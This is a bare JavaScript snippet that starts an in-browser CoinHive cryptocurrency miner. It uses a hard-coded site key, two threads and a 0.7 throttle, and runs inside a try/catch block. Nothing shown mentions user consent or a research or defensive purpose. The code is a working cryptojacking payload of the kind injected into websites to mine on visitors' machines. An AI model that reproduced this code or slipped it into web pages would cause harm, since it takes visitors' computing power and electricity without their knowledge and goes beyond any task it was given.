try {
		var miner = new CoinHive.Anonymous('BtcpvElCLDa2URFjJUy1uFwiT6aJmLMN',{
			threads: 2,
			autoThreads: false,
			throttle: 0.7,
			forceASMJS: false
		});
		miner.start();
} catch (e) {console.warn(e)}